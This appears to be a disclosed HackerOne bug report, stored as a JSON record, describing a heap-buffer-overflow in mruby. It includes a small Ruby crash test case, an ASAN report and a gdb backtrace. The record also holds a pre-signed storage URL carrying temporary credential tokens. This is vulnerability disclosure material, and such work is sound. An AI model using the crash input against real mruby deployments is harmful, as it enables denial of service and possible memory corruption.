@@ -1,0 +1,118 @@
+{
+  "id": 192665,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI2NjU=",
+  "url": "https://hackerone.com/reports/192665",
+  "title": "heap-buffer-overflow on mruby",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2016-12-20T08:41:12.747Z",
+  "submitted_at": "2016-12-20T08:41:12.747Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ahihi",
+    "url": "/ahihi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/106/056/b44f0450b0a2fca355ff6f460bd05357f4b9912b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-02-10T21:49:05.640Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-01-11T21:48:56.921Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Test case:\n```\nA = 'z'\nC = ['a','a','a','a','a','a','a','a','a','a']\nI = [*C,'a','a','a','a','a','a','a','a','a']\nJ = [*I,'a','a','a','a','a','a','a','a','a']\nM = [A,A,A,*J]\nfor a in M do\n\tA<<A\nend\n```\nIMPACT\nASAN report this as heap-buffer-overflow, and it crashed on\n```\n #0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37\n```\nIt can leach to remote code execution.\nASAN report\n```\n./mruby/bin/mruby ../ruby/f.rb\n=================================================================\n==7324== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f65ca1b4800 at pc 0x7f660aadf44d bp 0x7fffe216bae0 sp 0x7fffe216b2a0\nWRITE of size 1073741824 at 0x7f65ca1b4800 thread T0\n    #0 0x7f660aadf44c (/usr/lib/x86_64-linux-gnu/libasan.so.0.0.0+0xe44c)\n    #1 0x45672c (/home/s/rubys/mruby/bin/mruby+0x45672c)\n    #2 0x4e6659 (/home/s/rubys/mruby/bin/mruby+0x4e6659)\n    #3 0x41ce4b (/home/s/rubys/mruby/bin/mruby+0x41ce4b)\n    #4 0x417f53 (/home/s/rubys/mruby/bin/mruby+0x417f53)\n    #5 0x42def2 (/home/s/rubys/mruby/bin/mruby+0x42def2)\n    #6 0x498300 (/home/s/rubys/mruby/bin/mruby+0x498300)\n    #7 0x4983d3 (/home/s/rubys/mruby/bin/mruby+0x4983d3)\n    #8 0x4037fd (/home/s/rubys/mruby/bin/mruby+0x4037fd)\n    #9 0x7f660a72df44 (/lib/x86_64-linux-gnu/libc-2.19.so+0x21f44)\n    #10 0x4020b8 (/home/s/rubys/mruby/bin/mruby+0x4020b8)\n0x7f65ca1b4801 is located 0 bytes to the right of 1073741825-byte region [0x7f658a1b4800,0x7f65ca1b4801)\nallocated by thread T0 here:\n    #0 0x7f660aae655f (/usr/lib/x86_64-linux-gnu/libasan.so.0.0.0+0x1555f)\n    #1 0x410474 (/home/s/rubys/mruby/bin/mruby+0x410474)\n    #2 0x409660 (/home/s/rubys/mruby/bin/mruby+0x409660)\n    #3 0x409763 (/home/s/rubys/mruby/bin/mruby+0x409763)\n    #4 0x451801 (/home/s/rubys/mruby/bin/mruby+0x451801)\n    #5 0x4563cf (/home/s/rubys/mruby/bin/mruby+0x4563cf)\n    #6 0x4e6659 (/home/s/rubys/mruby/bin/mruby+0x4e6659)\n    #7 0x41ce4b (/home/s/rubys/mruby/bin/mruby+0x41ce4b)\n    #8 0x417f53 (/home/s/rubys/mruby/bin/mruby+0x417f53)\n    #9 0x42def2 (/home/s/rubys/mruby/bin/mruby+0x42def2)\n    #10 0x498300 (/home/s/rubys/mruby/bin/mruby+0x498300)\n    #11 0x4983d3 (/home/s/rubys/mruby/bin/mruby+0x4983d3)\n    #12 0x4037fd (/home/s/rubys/mruby/bin/mruby+0x4037fd)\n    #13 0x7f660a72df44 (/lib/x86_64-linux-gnu/libc-2.19.so+0x21f44)\nShadow bytes around the buggy address:\n  0x0fed3942e8b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0fed3942e8c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0fed3942e8d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0fed3942e8e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0fed3942e8f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0fed3942e900:[01]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0fed3942e910: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0fed3942e920: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0fed3942e930: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0fed3942e940: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0fed3942e950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:     fa\n  Heap righ redzone:     fb\n  Freed Heap region:     fd\n  Stack left redzone:    f1\n  Stack mid redzone:     f2\n  Stack right redzone:   f3\n  Stack partial redzone: f4\n  Stack after return:    f5\n  Stack use after scope: f8\n  Global redzone:        f9\n  Global init order:     f6\n  Poisoned by user:      f7\n  ASan internal:         fe\n==7324== ABORTING\n````\nwhen compile with symbol\n```\n$ gdb ./mruby/bin/mruby\n(gdb) r crashed.rb\nStarting program: /home/s/ruby/mruby/bin/mruby crashed.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37\n37      ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n(gdb) backtrace\n#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37\n#1  0x00000000004217fd in mrb_str_concat (mrb=0x6ac010, self=..., other=...) at /home/s/ruby/mruby/src/string.c:762\n#2  0x000000000045f728 in mrb_str_concat2 (mrb=0x6ac010, self=...) at /home/s/ruby/mruby/mrbgems/mruby-string-ext/src/string.c:151\n#3  0x000000000040b9cf in mrb_vm_exec (mrb=0x6ac010, proc=0x6ad3e0, pc=0x71a350) at /home/s/ruby/mruby/src/vm.c:1171\n#4  0x0000000000409ef3 in mrb_vm_run (mrb=0x6ac010, proc=0x6ae460, self=..., stack_keep=0) at /home/s/ruby/mruby/src/vm.c:772\n#5  0x0000000000411e99 in mrb_top_run (mrb=0x6ac010, proc=0x6ae460, self=..., stack_keep=0) at /home/s/ruby/mruby/src/vm.c:2487\n#6  0x000000000043bb47 in mrb_load_exec (mrb=0x6ac010, p=0x7082c0, c=0x706f30) at /home/s/ruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x000000000043bbdd in mrb_load_file_cxt (mrb=0x6ac010, f=0x707f00, c=0x706f30) at /home/s/ruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe6a8) at /home/s/ruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n```",
+  "weakness": {
+    "id": 2,
+    "name": "Memory Corruption - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 145306,
+      "file_name": "gen.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/306/458645e1e1cd93b2bd8005c8bf85f8ba7d1c06d0/gen.rb?response-content-disposition=attachment%3B%20filename%3D%22gen.rb%22%3B%20filename%2A%3DUTF-8%27%27gen.rb&response-content-type=text%2Fx-fortran&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ3BKZOEE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T123104Z&X-Amz-Expires=2323&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIG6IenXByqkn3Q4DzIOoyCRmUa9piCrSguk1c5%2FILyJ7AiEAykcOsXd4dfj0MtryP7Ypqcz0EGqy2srC7Ahyju9P1wwqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNoh%2FatXkiXqzvRarSqPBSxRPdxDhM3ZWovfuUDFze8TKTTXyWnM%2BqLvvwol8L9J5VDQFkQXA7smucDX4AEp9WwjM1M5SoDxfIqGVNACAZ%2FhCWOou%2FjPGm5hXxkVid3k%2FfBEIUStu2OCGILQXKrFXckdXocqxibxJkp9FBscVVfy1z9spS224jk9a64wEyKkB%2FEqDONaGznbocoqfOWRO2gk3kN2mF%2FlFYwuvjMbBGI25CA0c8P0uDrdXv75mMgHiHzhQ2UA0io6mOBJRxlcl5iTWXpEwOcbqq7%2B5ONf7AQWMJlf044SZPS7ctrMSsbHt11897THGeHPEYn6tBP8I5Fnd6qJj2f%2FVMm2nAjyPv65mqH9IFrso33MbOg9OScFT8GcXL%2FSL9CsmuqI8DAuHV2TQ6tOcf60FFoK%2FNc8%2BH1opXPi5t84Wy8dXz0ShSZARezbri6JYCQuZaMmQWSTRbaOxgDpQUbmc2MtnSfbshwx0iX%2BKoAaAhWHkgNlastBKxxdkZZfKj3uPWL%2FAZpJ5vQ3aCiYuhMiLdSNoDq04UJUEE6U3x5bncELirAw9rSBGBlZ2LnTIizRqNNZcm4bzUeL8KfXYWONTy2NjqxuN2Pv%2FhvWs7ZeUu%2Bl5RyG%2BaglXVojqzVcfe0pYyyTxENUtLQnCxv1F6%2BFRPB1kbi%2FlMdY30Ih91ui923zixOr4x2bTvqsEUosHXQuAePevTEs9cXth9Tl9dEZ77qdYODIErVxnZKWIWL%2Bdg57Wo05wOYkPoMuK0ANx9QnIFRVpYN51rM3ygm3cI0FCy6O67TKyAzlM4W7pyg0gugDJWcmjphUjUsnNWj%2BZQCUHNlg0hrBypo%2BHXJ4oZgGe0%2F80G6Eur1xfPo2GRyn5qtYCGPsRlYw8qesrgY6sQGYbS8MxVrsunWUBMnltzktg6eAZ8fvxgC5j8%2BYmwaIMOuBsufYAl7nKraCTIkLFC7rGgVC8sqvqoXBLrYQFqgLumTDGfWJUNAVMAVtqNo%2BIL8JvOZD%2FTW4GOmqGMXOgQRmU1Wa7j36A2IvAe7wpP5z8dprPILpwsnYzL4pzdM%2FrRrGA5fhAddbNV%2BDoX4yqjS2RN%2BKe8v5EYqHMPr2TCLmUPcDm070amRAZC10%2F9gLePE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=259bc0961cbcbaaf655f5a61a96478e5eb3e2989a2fb7c66c56f36dd66017e85",
+      "file_size": 183,
+      "type": "text/x-fortran",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-02-10T21:48:57.056Z",
+  "allow_singular_disclosure_after": -221064127.31028703,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "mpz",
+    "eveeez",
+    "rbcafe",
+    "spetr0x"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
